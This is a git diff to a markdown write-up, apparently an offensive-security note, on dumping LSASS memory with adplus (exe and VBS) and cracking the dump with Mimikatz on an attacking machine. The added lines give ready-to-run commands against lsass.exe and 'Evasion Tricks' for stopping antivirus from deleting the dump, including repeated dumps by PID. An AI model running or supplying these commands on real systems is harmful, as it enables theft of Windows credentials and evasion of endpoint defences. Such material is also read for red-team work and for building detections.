@@ -33,15 +33,22 @@ The output is a folder that contains the .dmp file.
 
 ![Adplus-VBS](./adplus_vbs.png)
 
+Download the file to your attacking machine and let Mimikatz do its usual magic.
+
+![Mimikatz](./mimikatz.png)
+
 ## Evasion Tricks
 
-Instead of using ```-pn lsass.exe``` use ```-p <lsass PID>```.
+If the dump file is deleted by the AV then try replacing ```-pn lsass.exe``` with ```-p <lsass PID>```. 
 
 If that doesn't work then use the ```-r``` flag which creates a dump file every X seconds. For some reason that worked for me and the files didn't get deleted. Obviously this is less stealthy as it's writing multiple files to disk.
 
     #New command
     #Create 10 dumps, 1 every 2 seconds
     adplus.exe -hang -p <PID> -o c:\users\mr.d0x\output\folder -r 10 2 -quiet
+
+    #Vbs
+    cscript.exe adplus_old.vbs -hang -pn lsass.exe -o c:\users\mr.d0x\output\folder -r 10 2 -quiet
 
 ## Issues
 
